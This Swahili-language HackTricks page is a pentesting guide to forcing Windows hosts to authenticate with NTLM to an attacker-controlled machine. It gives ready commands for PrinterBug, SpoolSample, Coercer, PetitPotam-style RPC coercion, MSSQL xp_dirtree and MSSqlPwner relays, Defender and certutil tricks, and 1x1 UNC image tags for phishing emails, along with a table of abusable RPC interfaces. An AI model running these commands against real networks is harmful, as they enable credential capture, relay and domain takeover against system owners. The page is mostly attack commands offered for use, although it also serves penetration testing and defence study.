# Forisha NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **remote authentication triggers** ulioandikwa kwa C# kwa kutumia MIDL compiler ili kuepuka dependencies za 3rd party.

## Spooler Service Abuse

Kama huduma ya _**Print Spooler**_ **imewezeshwa,** unaweza kutumia baadhi ya AD credentials zinazojulikana tayari ili **kuomba** print server ya Domain Controller **sasisho** kuhusu new print jobs na kuiambia tu **itume notification kwa mfumo fulani**.\
Kumbuka printer inapotuma notification kwa systems yoyote ya kiholela, inahitaji **kuauthenticate dhidi ya** hiyo **system**. Kwa hiyo, attacker anaweza kufanya huduma ya _**Print Spooler**_ iauthenticate dhidi ya system yoyote ya kiholela, na huduma itatumia **computer account** katika authentication hii.

Chini ya hood, primitive ya kawaida ya **PrinterBug** hutumia vibaya **`RpcRemoteFindFirstPrinterChangeNotificationEx`** kupitia **`\\PIPE\\spoolss`**. Attacker kwanza anafungua printer/server handle kisha anatoa fake client name katika `pszLocalMachine`, hivyo target spooler huunda notification channel **kurudi kwa host inayodhibitiwa na attacker**. Ndiyo maana effect ni **outbound authentication coercion** badala ya direct code execution.\
Kama unatafuta **RCE/LPE** katika spooler yenyewe, angalia [PrintNightmare](printnightmare.md). Ukurasa huu unalenga **coercion and relay**.

### Finding Windows Servers on the domain

Kwa kutumia PowerShell, pata orodha ya Windows boxes. Servers kwa kawaida zina kipaumbele, kwa hiyo tuzingatie hapo:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Kupata Spooler services zinazotegwa

Kwa kutumia toleo lililobadilishwa kidogo la @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), angalia kama Spooler Service inasikiliza:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Unaweza pia kutumia `rpcdump.py` kwenye Linux na kutafuta itifaki ya **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Au haraka jaribu host kutoka Linux kwa kutumia **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ukipenda **kufanya enumerate coercion surfaces** badala ya tu kuangalia kama spooler endpoint ipo, tumia **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Hii ni muhimu kwa sababu kuona endpoint katika EPM pekee hukwambia tu kwamba interface ya print RPC imesajiliwa. Hii **haihakikishi** kwamba kila coercion method inaweza kufikiwa kwa privileges zako za sasa au kwamba host itatoa authentication flow inayoweza kutumika.

### Muombe service ifanye authenticate dhidi ya arbitrary host

Unaweza compile [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
au tumia [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa uko kwenye Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Kwa **Coercer**, unaweza kulenga spooler interfaces moja kwa moja na kuepuka kubashiri ni RPC method gani ime-exposed:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Kulazimisha HTTP badala ya SMB kwa WebClient

Classic PrinterBug kwa kawaida hutoa uthibitishaji wa **SMB** kwenda `\\attacker\share`, ambao bado ni muhimu kwa **capture**, **relay to HTTP targets** au **relay where SMB signing is absent**.\
Hata hivyo, katika mazingira ya kisasa, relaying **SMB to SMB** mara nyingi huzuiwa na **SMB signing**, kwa hiyo waendeshaji mara nyingi hupendelea kulazimisha uthibitishaji wa **HTTP/WebDAV** badala yake.

Ikiwa target ina huduma ya **WebClient** ikiendeshwa, listener inaweza kubainishwa kwa umbo linalofanya Windows itumie **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Hii ni muhimu sana hasa unapochain na **`ntlmrelayx --adcs`** au targets nyingine za HTTP relay kwa sababu huepuka kutegemea SMB relayability kwenye connection iliyolazimishwa. Tahadhari muhimu ni kwamba **WebClient lazima iwe inafanya kazi** kwenye victim ili variant ya HTTP/WebDAV ifanye kazi.

### Kuchanganya na Unconstrained Delegation

Ikiwa attacker tayari ameshadukua computer yenye [Unconstrained Delegation](unconstrained-delegation.md), attacker anaweza **kulazimisha printer kujithibitisha dhidi ya computer hii**. Kwa sababu ya unconstrained delegation, **TGT** ya **computer account ya printer** itakuwa **imehifadhiwa kwenye** **memory** ya computer yenye unconstrained delegation. Kwa kuwa attacker tayari ameshadukua host hii, ataweza **kuipata ticket hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface kwenye pipe ileile ya spooler; tumia Coercer kuorodhesha methods zinazoweza kufikiwa kwenye host fulani
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (pia kupitia \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums zinazotumiwa vibaya mara nyingi: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: Methods hizi zinakubali parameters zinazoweza kubeba UNC path (kwa mfano, `\\attacker\share`). Zinapochakatwa, Windows itajithibitisha (machine/user context) kwa UNC hiyo, hivyo kuwezesha NetNTLM capture au relay.\
Kwa spooler abuse, **MS-RPRN opnum 65** bado ndiyo primitive inayotumika zaidi na iliyoandikwa vizuri zaidi kwa sababu protocol specification inaeleza wazi kwamba server inaunda notification channel kurudi kwa client iliyobainishwa na `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN kupitia \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: target inajaribu kufungua backup log path iliyopewa na kujithibitisha kwa UNC inayodhibitiwa na attacker.
- Practical use: kulazimisha Tier 0 assets (DC/RODC/Citrix/etc.) kutoa NetNTLM, kisha relay kwenda endpoints za AD CS (ESC8/ESC11 scenarios) au services nyingine zenye privileges.

## PrivExchange

Attack ya `PrivExchange` ni matokeo ya flaw iliyopatikana kwenye **Exchange Server `PushSubscription` feature**. Feature hii inaruhusu Exchange server kulazimishwa na any domain user mwenye mailbox kujithibitisha kwa host yoyote iliyotolewa na client kupitia HTTP.

Kwa default, **Exchange service huendesha kama SYSTEM** na hupewa privileges nyingi kupita kiasi (hasa, ina **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Flaw hii inaweza kutumiwa kuwezesha **relaying ya taarifa kwenda LDAP na baadaye kutoa NTDS database ya domain**. Katika hali ambazo relaying kwenda LDAP haiwezekani, flaw hii bado inaweza kutumika kufanya relay na kujithibitisha kwa hosts nyingine ndani ya domain. Utekelezaji uliofanikiwa wa attack hii unatoa access ya haraka kwa Domain Admin na account yoyote ya domain iliyothibitishwa.

## Inside Windows

Ikiwa tayari uko ndani ya Windows machine unaweza kulazimisha Windows kuunganika na server kwa kutumia privileged accounts kwa:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Au tumia mbinu hii nyingine: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Inawezekana kutumia certutil.exe lolbin (Microsoft-signed binary) kulazimisha uthibitishaji wa NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Uingizaji wa HTML

### Kupitia email

Ikiwa unajua **email address** ya user anayeingia ndani ya machine unayotaka compromise, unaweza tu kumtumia **email yenye 1x1 image** kama vile
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
na anapofungua, atajaribu kuauthenticate.

### MitM

Ikiwa unaweza kufanya shambulio la MitM dhidi ya kompyuta na kuingiza HTML kwenye ukurasa ambao ataona, unaweza kujaribu kuingiza picha kama ifuatavyo kwenye ukurasa:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Njia nyingine za kulazimisha na kuphish NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ikiwa unaweza kunasa [NTLMv1 challenges soma hapa jinsi ya kuzivunja](../ntlm/index.html#ntlmv1-attack).\
_Kumbuka kwamba ili kuvunja NTLMv1 unahitaji kuweka Responder challenge kuwa "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
